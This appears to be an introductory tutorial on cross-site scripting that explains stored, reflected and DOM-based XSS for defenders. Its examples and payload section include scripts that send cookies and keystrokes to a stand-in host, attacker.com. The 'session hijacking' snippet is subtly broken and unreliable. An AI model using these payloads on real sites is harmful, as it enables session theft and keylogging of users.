# XSS 101: Understanding Cross-Site Scripting

## Introduction

Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. These scripts execute in the victim's browser within the context of the vulnerable website, potentially allowing attackers to:

- Steal session cookies and authentication tokens
- Perform actions on behalf of the victim
- Deface web pages
- Redirect users to malicious sites
- Capture sensitive user input
- Spread malware

---

## Types of XSS Attacks

### 1. Stored XSS (Persistent XSS)

**Definition:** Malicious scripts are permanently stored on the server's database or file system. The script executes every time the page loads or is accessed by any user.

**Attack Flow:**
1. Attacker injects malicious script into a web application (e.g., comment section, user profile)
2. Script is stored in the backend database
3. Every time a user accesses the page containing the payload, the script executes
4. Affects all users who view the compromised content

**Characteristics:**
- Most dangerous type of XSS
- Affects multiple users
- No user interaction required (automatic execution)
- Difficult to detect and patch
- Persistent nature makes it harder to mitigate

**Common Vectors:**
- Comment sections and forums
- User profile fields (bio, name, etc.)
- Product reviews
- Chat applications
- Social media posts

**Example:**
```html
<!-- Attacker submits this as a comment -->
<script>
  fetch('https://attacker.com/steal.php?cookie=' + document.cookie);
</script>
```

---

### 2. Reflected XSS (Non-Persistent XSS)

**Definition:** Malicious script is reflected off a web server in an error message, search result, or any other response. The payload is NOT stored; it's included in the URL or form submission.

**Attack Flow:**
1. Attacker crafts a malicious URL containing JavaScript code
2. Attacker tricks user into clicking the link (via phishing, social engineering)
3. User's browser sends the request to the vulnerable server
4. Server reflects the untrusted input back in the response
5. Browser executes the malicious script

**Characteristics:**
- Does not persist on the server
- Requires user interaction (clicking a link)
- Payload is visible in URL (can be detected)
- Less severe than Stored XSS
- Easier to patch

**Common Vectors:**
- URL parameters (query strings)
- Search functionality
- Form fields
- HTTP headers (User-Agent, Referer)
- Error messages

**Example:**
```
Vulnerable URL:
https://example.com/search?q=<script>alert('XSS')</script>

Malicious URL:
https://example.com/search?q=<img src=x onerror="fetch('https://attacker.com/steal.php?cookie='+document.cookie)">
```

---

### 3. DOM-based XSS (Type-0 XSS)

**Definition:** Vulnerability exists in client-side code (JavaScript). The DOM is modified unsafely by JavaScript code, allowing injection of malicious scripts. The server-side code is not involved.

**Attack Flow:**
1. Attacker crafts a malicious URL with payload in URL fragment or query parameter
2. User clicks the link
3. JavaScript code on the page reads the untrusted input from the URL
4. Untrusted input is used to update the DOM (without sanitization)
5. Malicious script executes in the browser

**Characteristics:**
- Vulnerability is in client-side JavaScript
- Server-side logs may not show the payload (it's not sent to the server)
- Difficult to detect and mitigate
- URL fragments (#) are not sent to the server
- Growing concern with modern JavaScript-heavy applications

**Common Vectors:**
- URL hash fragments
- localStorage/sessionStorage manipulation
- innerHTML assignment
- jQuery methods (html(), append(), etc.)
- JavaScript template engines

**Example:**
```javascript
// Vulnerable Code
var userInput = location.hash.substring(1);
document.getElementById('output').innerHTML = userInput;

// Attacker URL
https://example.com/page#<img src=x onerror="alert('DOM XSS')">

// When page loads, JavaScript processes the hash and executes the payload
```

## Comparison Table

| Aspect | Stored XSS | Reflected XSS | DOM-based XSS |
|--------|-----------|---------------|---------------|
| **Persistence** | Stored in database | Not stored | Not stored |
| **Scope** | Multiple users | Single user (per session) | Single user (per session) |
| **Detectability** | Harder to detect | Visible in URL | Hidden in client-side code |
| **Server Involvement** | Yes | Yes | No (client-side only) |
| **User Interaction** | Not required | Required | Usually required |
| **Severity** | Critical | Medium | Medium-High |
| **Patch Difficulty** | Hard | Easy-Medium | Medium-Hard |

## Common XSS Payloads

### Basic Alert
```javascript
<script>alert('XSS Vulnerability')</script>
```

### Cookie Stealing
```javascript
<img src=x onerror="fetch('https://attacker.com/log.php?cookie='+document.cookie)">
```

### Session Hijacking
```javascript
<script>
  new Image().src = 'https://attacker.com/steal.php?session=' + 
  fetch('/api/user').then(r => r.json()).then(d => d.sessionId);
</script>
```

### Keylogger
```javascript
<script>
  document.onkeypress = function(e) {
    fetch('https://attacker.com/log.php?key=' + e.key);
  }
</script>
```

---

## Key Takeaways

1. **XSS is a serious threat** - It can lead to complete account compromise and data theft
2. **Multiple attack vectors exist** - Developers must understand all three types to implement proper defenses
3. **Prevention is crucial** - Input validation, output encoding, and Content Security Policy are essential
4. **Context matters** - The same payload may work differently in HTML, JavaScript, CSS, or URL contexts
